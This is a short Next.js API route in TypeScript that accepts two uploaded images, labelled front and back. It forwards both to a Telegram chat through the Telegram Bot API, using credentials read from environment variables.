import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN!;
  const chatId = process.env.TELEGRAM_CHAT_ID!;
  const formData = await req.formData();

  try {
    const sendPhoto = async (photo: File) => {
      const fd = new FormData();
      fd.append('chat_id', chatId);
      fd.append('photo', photo);

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: fd,
      });
    };

    const front = formData.get('front') as File;
    const back = formData.get('back') as File;

    if (!front || !back) {
      return NextResponse.json({ error: 'Both images are required' }, { status: 400 });
    }

    await Promise.all([sendPhoto(front), sendPhoto(back)]);
    return NextResponse.json({ success: true });
  } catch (err) {
    console.error('Telegram upload error:', err);
    return NextResponse.json({ error: 'Failed to send images' }, { status: 500 });
  }
}
